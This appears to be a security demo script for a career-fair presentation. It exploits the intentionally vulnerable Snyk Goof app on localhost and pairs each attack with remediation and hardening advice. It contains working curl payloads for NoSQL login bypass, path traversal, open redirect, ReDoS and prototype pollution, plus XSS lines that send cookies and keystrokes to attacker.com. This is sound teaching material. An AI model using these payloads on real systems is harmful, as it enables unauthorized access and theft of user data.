# Vulnerability Assessment Demo - Reverse Career Fair
## Red Hat Cybersecurity Engineering Demonstration

**Application:** Snyk Goof (Intentionally Vulnerable Node.js App)
**Demo Environment:** http://localhost:3001
**Presenter Role:** Senior Red Hat Cybersecurity Engineer

---

## Executive Summary

This demonstration showcases **offensive security testing** and **vulnerability assessment** capabilities using a deliberately vulnerable web application. The demo highlights:
- **138 total vulnerabilities** (36 Critical, 65 High, 28 Moderate, 9 Low)
- Real-world exploitation techniques
- Security tooling and automation
- Defensive remediation strategies

---

## Environment Setup

### Quick Start
```bash
# Start MongoDB container
docker run --rm -d -p 27017:27017 --name goof-mongo mongo:3

# Navigate to project
cd /Users/bigmac/Documents/workspace/agbonjaru/personal/projects/nodejs-goof

# Install dependencies
npm install

# Start vulnerable application
npm start
```

**Application URL:** http://localhost:3001
**Database:** MongoDB (localhost:27017)

---

## Attack Demonstrations

### 1. NoSQL Injection (Authentication Bypass)

**Vulnerability:** Improper input validation on login endpoint
**CVSS Score:** 9.8 (Critical)
**CWE:** CWE-89 (Improper Neutralization of Special Elements)

#### Normal Login Flow
```bash
# Failed login attempt
curl -X POST http://localhost:3001/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin@snyk.io", "password": "WrongPassword"}'

# Response: 401 Unauthorized
```

#### Exploitation
```bash
# NoSQL Injection - Authentication bypass using MongoDB operators
curl -X POST http://localhost:3001/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin@snyk.io", "password": {"$gt": ""}}'

# Response: 302 Redirect to /admin (SUCCESS)
```

**Attack Vector:**
- The `{"$gt": ""}` operator tells MongoDB to match any password > empty string
- Bypasses authentication without knowing credentials
- Exploits unsanitized JSON objects passed to database queries

**Impact:**
- Complete authentication bypass
- Unauthorized admin access
- Session hijacking potential

**Location:** `routes/index.js` - loginHandler function

---

### 2. Directory Traversal / Path Injection

**Vulnerability:** Unvalidated template layout parameter
**CVSS Score:** 7.5 (High)
**CWE:** CWE-22 (Path Traversal)

#### Step 1: Authenticate
```bash
# Login and save session cookie
curl -X POST http://localhost:3001/login \
  -c /tmp/cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin@snyk.io", "password": {"$gt": ""}}'
```

#### Step 2: Exploit Path Traversal
```bash
# Read arbitrary files using layout parameter
curl -X POST http://localhost:3001/account_details \
  -b /tmp/cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "admin@snyk.io",
    "firstname": "admin",
    "lastname": "admin",
    "country": "IL",
    "phone": "+972551234123",
    "layout": "./../package.json"
  }'

# Response: Contents of package.json rendered in page
```

**Attack Vector:**
- The `layout` parameter is passed unsanitized to Handlebars template engine
- Allows reading arbitrary files via relative path traversal
- Could expose sensitive configuration files, credentials, source code

**Potential Targets:**
- `../../etc/passwd` (on Linux systems)
- `./../.env` (environment variables with secrets)
- `./../config/database.yml`
- `./../app.js` (application source code)

**Location:** `routes/index.js:72` - account_details handler

---

### 3. Cross-Site Scripting (XSS)

**Vulnerability:** Improper output encoding in template rendering
**CVSS Score:** 6.1 (Medium)
**CWE:** CWE-79 (Cross-site Scripting)

#### Reflected XSS via redirectPage Parameter
```bash
# Inject malicious JavaScript
curl -s "http://localhost:3001/login?redirectPage=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"

# HTML Output:
# <input type="hidden" name="redirectPage" value=""><script>alert(1)</script>" />
```

**Attack Vector:**
- Template uses `<%- redirectPage %>` (unescaped) instead of `<%= redirectPage %>` (escaped)
- Allows injection of arbitrary HTML/JavaScript
- Can steal session cookies, perform phishing, redirect users

**Exploitation Scenarios:**
```javascript
// Session cookie theft
"><script>fetch('https://attacker.com/?c='+document.cookie)</script>

// Keylogger injection
"><script>document.addEventListener('keypress',e=>fetch('https://attacker.com/?k='+e.key))</script>

// Credential harvesting
"><script>document.forms[0].action='https://attacker.com/steal'</script>
```

**Location:** `views/admin.ejs` - redirectPage field

---

### 4. Open Redirect

**Vulnerability:** Unvalidated redirect URL
**CVSS Score:** 4.3 (Medium)
**CWE:** CWE-601 (URL Redirection to Untrusted Site)

#### Exploitation
```bash
# Redirect to external malicious site
curl -I "http://localhost:3001/login?redirectPage=https://evil.com/phishing"

# Application redirects user to external site after login
```

**Attack Vector:**
- No validation that redirect URL is internal
- Enables phishing attacks disguised as legitimate site
- Common vector for credential theft campaigns

**Phishing Chain:**
1. Attacker sends: `http://localhost:3001/login?redirectPage=https://fake-snyk.com`
2. Victim logs in successfully on legitimate site
3. Automatically redirected to attacker's phishing page
4. Victim trusts page because they just logged in

**Location:** `routes/index.js:72` - loginHandler redirect logic

---

## Vulnerability Scanning Results

### NPM Audit Summary
```bash
npm audit --production

Total Vulnerabilities: 138
├── Critical:  36
├── High:      65
├── Moderate:  28
└── Low:        9
```

### Notable Vulnerable Dependencies

| Package | Version | Severity | CVE | Impact |
|---------|---------|----------|-----|--------|
| `mongoose` | 4.2.4 | High | CVE-2019-2391 | Buffer Memory Exposure |
| `marked` | 0.3.5 | High | CVE-2017-17461 | XSS via markdown |
| `st` | 0.2.4 | High | CVE-2015-8858 | Directory Traversal |
| `ejs` | 1.0.0 | Critical | CVE-2017-1000188 | Remote Code Execution |
| `lodash` | 4.17.4 | High | CVE-2019-10744 | Prototype Pollution |
| `express` | 4.12.4 | High | CVE-2017-16119 | Security Misconfig |
| `validator` | 13.5.2 | Medium | - | ReDoS vulnerabilities |

---

## Red Hat Security Best Practices

### 1. SELinux Enforcement
```bash
# Confine application with SELinux policies
semanage fcontext -a -t httpd_sys_content_t "/opt/goof(/.*)?"
restorecon -Rv /opt/goof

# Run app in confined domain
systemctl start nodejs-goof.service
```

### 2. Firewalld Configuration
```bash
# Restrict network access
firewall-cmd --permanent --add-rich-rule='
  rule family="ipv4"
  source address="10.0.0.0/8"
  port port="3001" protocol="tcp"
  accept'
firewall-cmd --reload
```

### 3. SCAP Security Scanning
```bash
# Run OpenSCAP compliance scan
oscap xccdf eval \
  --profile xccdf_org.ssgproject.content_profile_pci-dss \
  --results scan-results.xml \
  /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml
```

### 4. Container Security Scanning
```bash
# Scan container image for vulnerabilities
podman scan nodejs-goof:latest

# Run with reduced privileges
podman run --cap-drop=ALL --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges:true \
  nodejs-goof:latest
```

---

## Remediation Strategies

### NoSQL Injection Mitigation
```javascript
// routes/index.js - BEFORE (Vulnerable)
User.find({ username: req.body.username, password: req.body.password })

// AFTER (Secure)
const username = String(req.body.username);
const password = String(req.body.password);
User.find({ username: username, password: password })

// Better: Use parameterized queries and hash passwords
const bcrypt = require('bcrypt');
const hashedPassword = await bcrypt.hash(password, 10);
```

### Directory Traversal Mitigation
```javascript
// routes/index.js - BEFORE (Vulnerable)
res.render('account', req.body);

// AFTER (Secure)
const allowedFields = ['email', 'firstname', 'lastname', 'country', 'phone'];
const sanitizedData = {};
allowedFields.forEach(field => {
  if (req.body[field]) sanitizedData[field] = req.body[field];
});
res.render('account', sanitizedData);
```

### XSS Mitigation
```ejs
<!-- views/admin.ejs - BEFORE (Vulnerable) -->
<input type="hidden" name="redirectPage" value="<%- redirectPage %>" />

<!-- AFTER (Secure) -->
<input type="hidden" name="redirectPage" value="<%= redirectPage %>" />
```

### Open Redirect Mitigation
```javascript
// routes/index.js - BEFORE (Vulnerable)
res.redirect(req.query.redirectPage || '/admin');

// AFTER (Secure)
const allowedRedirects = ['/admin', '/dashboard', '/profile'];
const redirect = req.query.redirectPage || '/admin';
if (allowedRedirects.includes(redirect)) {
  res.redirect(redirect);
} else {
  res.redirect('/admin');
}
```

---

## Demo Talking Points

### For Technical Audience
1. **Real-world attack vectors** - These aren't theoretical; they're actively exploited
2. **Defense in depth** - Multiple layers: input validation, output encoding, WAF, monitoring
3. **Shift-left security** - Catch vulnerabilities in development with SAST/DAST tools
4. **Container security** - Red Hat's approach to securing containerized workloads
5. **Compliance automation** - SCAP/OpenSCAP for automated security baselines

### Red Hat Security Ecosystem
- **Red Hat Insights** - Proactive vulnerability detection
- **Red Hat Quay** - Container image scanning and signing
- **Red Hat Advanced Cluster Security** - Kubernetes security
- **SELinux** - Mandatory access control
- **FIPS 140-2** - Cryptographic module validation
- **STIG Compliance** - Automated security hardening

### Career Skills Demonstrated
✅ **Offensive Security Testing**
✅ **Vulnerability Assessment & Exploitation**
✅ **OWASP Top 10 Knowledge**
✅ **Secure Code Review**
✅ **Linux Hardening (SELinux, firewalld)**
✅ **Container Security**
✅ **Compliance Frameworks (PCI-DSS, STIG)**
✅ **Security Automation & Tooling**

---

## Additional Attack Vectors (Time Permitting)

### ReDoS (Regular Expression Denial of Service)
```bash
# Validator library ReDoS via email field
curl -X POST http://localhost:3001/account_details \
  -H 'Content-Type: application/json' \
  -d '{"email": "'$(seq -s "" -f "<" 100000)'"}'

# Causes CPU spike and application hang
```

### Prototype Pollution
```bash
# TypeORM prototype pollution
curl -X POST http://localhost:3001/api/users \
  -H 'Content-Type: application/json' \
  -d '{"__proto__": {"isAdmin": true}}'
```

### Command Injection (if mysql enabled)
```bash
# SQL injection via user input
# See: exploits/shell-injection.md
```

---

## Q&A Preparation

**Q: How would you prioritize remediation?**
A: CVSS score + exploitability + business impact. Critical auth bypass first, then RCE, then XSS/CSRF.

**Q: How does this apply to Red Hat environments?**
A: Same vulnerabilities exist in RHEL deployments. We add SELinux confinement, FIPS crypto, SCAP scanning, and Insights for defense.

**Q: What tools would you use in production?**
A: Snyk/Sonatype for SCA, OWASP ZAP/Burp for DAST, SonarQube for SAST, Falco/ACS for runtime protection.

**Q: How do you balance security with development velocity?**
A: Automate security in CI/CD pipeline, use pre-commit hooks, developer security training, and risk-based prioritization.

---

## Cleanup Commands

```bash
# Stop application
pkill -f "node app.js"

# Stop MongoDB container
docker stop goof-mongo

# Remove test cookies
rm /tmp/cookies.txt
```

---

## References

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **CWE Database:** https://cwe.mitre.org/
- **Red Hat Security:** https://access.redhat.com/security/
- **CVE Details:** https://www.cvedetails.com/
- **Snyk Vulnerability DB:** https://snyk.io/vuln/

---

**Demo Duration:** 15-20 minutes
**Difficulty Level:** Intermediate to Advanced
**Target Audience:** Security Engineers, DevSecOps Teams, Technical Leadership

**Prepared by:** Red Hat Cybersecurity Engineering Candidate
**Date:** October 2025


Quick Demo Commands

  # NoSQL Injection
  curl -X POST
  http://localhost:3001/login -H
  'Content-Type: application/json' \
    -d '{"username": "admin@snyk.io", 
  "password": {"$gt": ""}}'

  # Directory Traversal  
  curl -X POST
  http://localhost:3001/login -c
  /tmp/cookies.txt -H 'Content-Type: 
  application/json' \
    -d '{"username": "admin@snyk.io", 
  "password": {"$gt": ""}}'
  curl -X POST http://localhost:3001/a
  ccount_details -b /tmp/cookies.txt
  -H 'Content-Type: application/json'
  \
    -d '{"email": "admin@snyk.io", 
  "firstname": "admin", "lastname": 
  "admin", "country": "IL", "phone": 
  "+972551234123", "layout": 
  "./../package.json"}'

  # XSS
  curl "http://localhost:3001/login?re
  directPage=%22%3E%3Cscript%3Ealert(1
  )%3C/script%3E"
